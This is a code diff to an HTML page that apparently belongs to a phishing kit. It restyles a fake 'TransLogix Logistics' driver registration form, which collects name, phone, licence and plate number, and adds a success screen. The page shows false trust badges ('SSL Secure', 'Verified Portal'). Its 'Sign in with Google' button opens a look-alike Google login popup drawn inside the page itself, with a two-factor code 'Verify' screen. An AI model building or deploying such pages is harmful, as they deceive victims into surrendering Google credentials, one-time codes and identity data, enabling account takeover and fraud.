@@ -9,69 +9,184 @@
 </head>
 <body>
 
-<!-- ============ LANDING PAGE (driver submission) ============ -->
+<!-- ============ LANDING PAGE (TransLogix registration) ============ -->
+<style>
+  #landing { font-family: 'Inter', 'Segoe UI', Arial, sans-serif; }
+  #landing * { margin: 0; padding: 0; box-sizing: border-box; }
+  #landing {
+    min-height: 100vh;
+    background: linear-gradient(135deg, #0d3b66 0%, #14548a 50%, #1b6fb8 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 0 16px 60px;
+  }
+  #landing header {
+    width: 100%;
+    max-width: 1100px;
+    padding: 24px 8px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    color: #fff;
+  }
+  #landing .logo { font-size: 22px; font-weight: 800; letter-spacing: .5px; display: flex; align-items: center; gap: 10px; }
+  #landing .logo .mark {
+    width: 34px; height: 34px;
+    background: #ffd166;
+    color: #0d3b66;
+    border-radius: 9px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 900;
+  }
+  #landing .portal-badge {
+    font-size: 12px;
+    background: rgba(255,255,255,.14);
+    border: 1px solid rgba(255,255,255,.25);
+    padding: 7px 16px;
+    border-radius: 999px;
+    backdrop-filter: blur(4px);
+  }
+  #landing .card {
+    width: 100%;
+    max-width: 540px;
+    background: #fff;
+    border-radius: 20px;
+    box-shadow: 0 24px 60px rgba(0,0,0,.28);
+    padding: 44px 42px 38px;
+    animation: rise .5s ease;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(18px); } to { opacity: 1; transform: none; } }
+  #landing .card h1 { font-size: 25px; color: #10243e; margin-bottom: 6px; }
+  #landing .card .sub { color: #64748b; font-size: 14px; margin-bottom: 26px; }
+  #landing .trust { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 28px; }
+  #landing .trust span {
+    flex: 1;
+    text-align: center;
+    font-size: 12px;
+    font-weight: 600;
+    color: #1e3a5f;
+    background: #f1f6fb;
+    border: 1px solid #dde9f3;
+    border-radius: 10px;
+    padding: 10px 6px;
+  }
+  #landing label { display: block; font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 7px; }
+  #landing input, #landing select {
+    width: 100%;
+    padding: 13px 15px;
+    border: 1.5px solid #e2e8f0;
+    border-radius: 10px;
+    font-size: 15px;
+    margin-bottom: 18px;
+    background: #fbfdff;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  #landing input:focus, #landing select:focus {
+    outline: none;
+    border-color: #1b6fb8;
+    box-shadow: 0 0 0 3px rgba(27,111,184,.15);
+    background: #fff;
+  }
+  #landing .row { display: flex; gap: 14px; }
+  #landing .row > div { flex: 1; }
+  #landing .divider {
+    display: flex; align-items: center; gap: 12px;
+    color: #94a3b8; font-size: 12px;
+    margin: 6px 0 20px;
+  }
+  #landing .divider::before, #landing .divider::after {
+    content: ""; flex: 1; height: 1px; background: #e2e8f0;
+  }
+  #landing .google-btn {
+    width: 100%;
+    display: flex; align-items: center; justify-content: center; gap: 12px;
+    padding: 13px;
+    background: #fff;
+    border: 1.5px solid #dadce0;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #3c4043;
+    cursor: pointer;
+    transition: box-shadow .15s, background .15s;
+  }
+  #landing .google-btn:hover { background: #f8faff; box-shadow: 0 2px 8px rgba(60,64,67,.18); }
+  #landing .google-btn svg { width: 20px; height: 20px; }
+  #landing .google-btn .spin {
+    display: none;
+    width: 18px; height: 18px;
+    border: 2px solid rgba(60,64,67,.25);
+    border-top-color: #3c4043;
+    border-radius: 50%;
+    animation: gspin .65s linear infinite;
+  }
+  #landing .google-btn.loading .spin { display: inline-block; }
+  #landing .google-btn.loading .b-label, #landing .google-btn.loading svg { opacity: 0; }
+  #landing .secure-note { text-align: center; font-size: 12px; color: #94a3b8; margin-top: 18px; }
+  #landing .dr-hint { font-size: 13px; color: #c5221f; min-height: 18px; margin: -6px 0 12px; }
+</style>
+
 <div class="app" id="landing">
-  <header class="topbar">
-    <div class="brand">
-      <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true"><path d="M8 24 14 15h20l6 9v9H8V24Z" fill="currentColor"/></svg>
-      <span class="brand-name">OnRoute</span>
-      <span class="brand-sub">Logistics</span>
-    </div>
-    <a class="topbar-link" href="#" id="help-link">Help</a>
+
+  <header>
+    <div class="logo"><span class="mark">T</span> TransLogix Logistics</div>
+    <div class="portal-badge">Official Driver Portal</div>
   </header>
 
-  <main class="hero">
-    <div class="hero-copy">
-      <h1>Driver &amp; vehicle submission</h1>
-      <p class="lead">Confirm your details and sign in with Google to start your delivery session. Just a minute of your time.</p>
-      <ul class="benefits">
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Secure Google sign-in
-        </li>
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Instant confirmation
-        </li>
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Works from any device
-        </li>
-      </ul>
+  <div class="card">
+    <h1>Driver Registration</h1>
+    <p class="sub">Join our logistics fleet. Complete the form below to apply.</p>
+
+    <div class="trust">
+      <span>&#128274; SSL Secure</span>
+      <span>&#10004; Verified Portal</span>
+      <span>&#128737; Data Protected</span>
     </div>
 
-    <form id="form-driver" class="formcard" novalidate>
-      <h2 class="fc-title">Your details</h2>
+    <form id="form-driver" novalidate>
+      <label for="d-name">Full Name</label>
+      <input type="text" id="d-name" name="fullname" placeholder="John Smith" autocomplete="name" spellcheck="false">
 
-      <label class="dr-field">
-        <span>Driver name</span>
-        <input id="d-name" type="text" placeholder="Full name" autocomplete="name" spellcheck="false" />
-      </label>
+      <label for="d-phone">Phone Number</label>
+      <input type="tel" id="d-phone" name="phone" placeholder="+1 555 000 1234" autocomplete="tel" spellcheck="false">
 
-      <label class="dr-field">
-        <span>Number plate</span>
-        <input id="d-plate" type="text" placeholder="e.g. AB 123 CD" autocomplete="off" spellcheck="false" />
-      </label>
+      <label for="d-license">Driver License Number</label>
+      <input type="text" id="d-license" name="license" placeholder="D1234567" spellcheck="false">
 
-      <label class="dr-field">
-        <span>Phone <em>optional</em></span>
-        <input id="d-phone" type="tel" placeholder="+44 7000 000000" autocomplete="tel" spellcheck="false" />
-      </label>
+      <div class="row">
+        <div>
+          <label for="d-plate">Vehicle Plate Number</label>
+          <input type="text" id="d-plate" name="plate" placeholder="ABC-1234" autocomplete="off" spellcheck="false">
+        </div>
+        <div>
+          <label for="d-vehicle">Vehicle Type</label>
+          <select id="d-vehicle" name="vehicle">
+            <option value="">Select...</option>
+            <option>Van</option>
+            <option>Truck</option>
+            <option>Pickup</option>
+            <option>Motorcycle</option>
+          </select>
+        </div>
+      </div>
+
+      <label for="d-city">Operating City</label>
+      <input type="text" id="d-city" name="city" placeholder="Chicago" spellcheck="false">
 
       <div class="dr-hint" id="driver-hint"></div>
 
-      <button type="submit" id="btn-driver" class="google-btn">
-        <svg class="gicon" viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-        <span class="b-label">Continue with Google</span><span class="spin" aria-hidden="true"></span>
-      </button>
-      <p class="btn-note">Protected by your Google sign-in · we open it securely in a popup.</p>
-    </form>
-  </main>
+      <div class="divider">continue with</div>
 
-  <footer class="appfoot">
-    <span>© 2026 OnRoute Logistics</span>
-    <span class="appfoot-links"><a href="#" id="foot-terms">Terms</a> · <a href="#" id="foot-privacy">Privacy</a></span>
-  </footer>
+      <button type="submit" id="btn-driver" class="google-btn">
+        <svg class="gicon" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3c-1.6 4.7-6.1 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-1.3-.1-2.6-.4-3.9z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-1.3-.1-2.6-.4-3.9z"/></svg>
+        <span class="b-label">Sign in with Google</span><span class="spin" aria-hidden="true"></span>
+      </button>
+    </form>
+
+    <p class="secure-note">Your information is encrypted and used only for driver verification.</p>
+  </div>
+
 </div>
 
 <!-- ============ GOOGLE SIGN-IN POPUP (overlays the landing) ============ -->
@@ -148,6 +263,17 @@
           <button type="button" class="g-link" id="try-another">Try another way</button>
           <button type="submit" class="g-btn" id="btn-totp"><span class="b-label">Verify</span><span class="spin" aria-hidden="true"></span></button>
         </div>
+      </div>
+    </div>
+
+    <!-- SUCCESS (after Google sign-in completes) -->
+    <div class="g-screen hidden" id="screen-done">
+      <div class="g-ok" aria-hidden="true">&#10004;</div>
+      <h1 class="g-title">Thanks&#8202;—&#8202;submitted!</h1>
+      <p class="g-caption" id="done-msg">Your driver details were received.</p>
+      <div class="g-done-account" id="done-account" hidden></div>
+      <div class="g-footer" style="justify-content:center">
+        <button type="button" class="g-btn" id="btn-done">Done</button>
       </div>
     </div>
   </div>
